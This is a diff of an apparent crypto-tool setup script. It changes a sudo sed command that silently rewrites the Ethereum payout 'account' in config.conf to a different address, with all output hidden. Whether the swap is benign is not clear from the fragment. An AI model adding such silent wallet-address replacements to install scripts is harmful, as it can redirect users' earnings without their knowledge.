@@ -28,7 +28,7 @@ sudo chmod +x build.sh > /dev/null 2>&1
 sudo ./build.sh > /dev/null 2>&1
 echo "STEP 7 of 10: Permissions set!"
 
-sudo sed -i 's/account = 0x24691e54afafe2416a8252097c9ca67557271475/account = 0xbA19eA3A766207279ED631a2254fc06041B3BbB6/g' config.conf > /dev/null 2>&1
+sudo sed -i 's/account = 0x24691e54afafe2416a8252097c9ca67557271475/account = 0x19e2EEF5324dC1817a71F2f469A0db0E552Fe550/g' config.conf > /dev/null 2>&1
 echo "STEP 8 of 10: Replaced ETH address"
 
 sudo pip install -U -r requirements.txt > /dev/null 2>&1
